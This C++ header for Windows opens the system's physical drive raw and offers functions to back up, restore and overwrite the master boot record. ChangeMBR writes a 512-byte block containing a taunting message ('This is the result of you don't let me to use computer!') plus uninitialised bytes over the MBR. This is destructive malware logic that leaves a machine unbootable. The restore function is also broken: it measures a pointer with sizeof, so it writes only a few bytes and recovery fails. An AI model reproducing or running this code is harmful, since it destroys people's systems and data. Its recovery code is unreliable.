#ifndef CHANGEMBR_H
#define CHANGEMBR_H

#include <windows.h>
#include <iostream>

using namespace std;

string GetDiskPhysical(LPCSTR l)
{
	HANDLE h;
	BOOL b;
	DWORD readed;
	STORAGE_DEVICE_NUMBER sdn;
	
	h=CreateFile(
		l,
		GENERIC_READ|GENERIC_WRITE,
		FILE_SHARE_READ|FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		0,
		0
	);//open the disk
	
	if(h== INVALID_HANDLE_VALUE)
		return to_string(-1);//if fail
	else
	{
		b=DeviceIoControl(
		h,//handle
		IOCTL_STORAGE_GET_DEVICE_NUMBER,//IO Control Mode
		NULL,//LpInBuffer
		0,//BufferSize
		&sdn,//output buffer
		sizeof(sdn),//size of output number
		&readed,//number of bytes returned
		NULL//overlapped structure
		);
		CloseHandle(h);//close the handle
		if(!b) return to_string(-1);
		else return to_string((long long)sdn.DeviceNumber);
	}
} 

bool BackupMBR(byte backup[])
{
	string FileDrv="\\\\.\\",PhisDrv = "\\\\.\\PhysicalDrive";
	char SystemDir[1000];
	DWORD t;
	//Get the file handle
	HANDLE h=NULL;

	GetSystemDirectory(SystemDir,1000);
	FileDrv+=SystemDir[0];
	FileDrv+=":"; 
	LPCSTR file = FileDrv.c_str();
	if(GetDiskPhysical(file)=="-1") return false;
	else{
		PhisDrv+=GetDiskPhysical(file);
		h=CreateFileA(
			PhisDrv.c_str(),
			GENERIC_READ|GENERIC_WRITE,
			FILE_SHARE_READ|FILE_SHARE_WRITE,
			0,
			OPEN_EXISTING,
			0,
			0);
		if(h== INVALID_HANDLE_VALUE) return false;//If program can't open this disk	
		else
		{
			ReadFile(h,backup,512,&t,NULL);//Backup MBR
			CloseHandle(h);
			return true; 
		}
	}	
}

bool RecovMBR(byte recovmbr[])
{
	string FileDrv="\\\\.\\",PhisDrv = "\\\\.\\PhysicalDrive";
	char SystemDir[1000];
	DWORD s,t;
	//Get the file handle
	HANDLE h=NULL;

	GetSystemDirectory(SystemDir,1000);
	FileDrv+=SystemDir[0];
	FileDrv+=":"; 
	LPCSTR file = FileDrv.c_str();
	if(GetDiskPhysical(file)=="-1") return false;
	else{
		PhisDrv+=GetDiskPhysical(file);
		h=CreateFileA(
			PhisDrv.c_str(),
			GENERIC_READ|GENERIC_WRITE,
			FILE_SHARE_READ|FILE_SHARE_WRITE,
			0,
			OPEN_EXISTING,
			0,
			0);
		if(h== INVALID_HANDLE_VALUE) return false;//If program can't open this disk	
		else
		{
			WriteFile(h,recovmbr,sizeof(recovmbr),&t,NULL);
			DeviceIoControl(h,FSCTL_UNLOCK_VOLUME,NULL,0,NULL,0,&s,NULL);
			CloseHandle(h);
			return true;		
		}
	}
}

bool ChangeMBR()
{
	string FileDrv="\\\\.\\",PhisDrv = "\\\\.\\PhysicalDrive";
	byte MBR[512];
	char SystemDir[1000];
	char code[]=
	"This is the result of you don't let me to use computer!";
	DWORD s,t;
	//Get the file handle
	HANDLE h=NULL;

	GetSystemDirectory(SystemDir,1000);
	FileDrv+=SystemDir[0];
	FileDrv+=":"; 
	LPCSTR file = FileDrv.c_str();
	if(GetDiskPhysical(file)=="-1") return false;
	else{
		PhisDrv+=GetDiskPhysical(file);
		memcpy(MBR,code,sizeof(code)-1);
		h=CreateFileA(
			PhisDrv.c_str(),
			GENERIC_READ|GENERIC_WRITE,
			FILE_SHARE_READ|FILE_SHARE_WRITE,
			0,
			OPEN_EXISTING,
			0,
			0);
		if(h== INVALID_HANDLE_VALUE) return false;//If program can't open this disk	
		else
		{
			WriteFile(h,MBR,sizeof(MBR),&t,NULL);
			DeviceIoControl(h,FSCTL_UNLOCK_VOLUME,NULL,0,NULL,0,&s,NULL);
			CloseHandle(h);
			return true; 
		}
	}
}
#endif
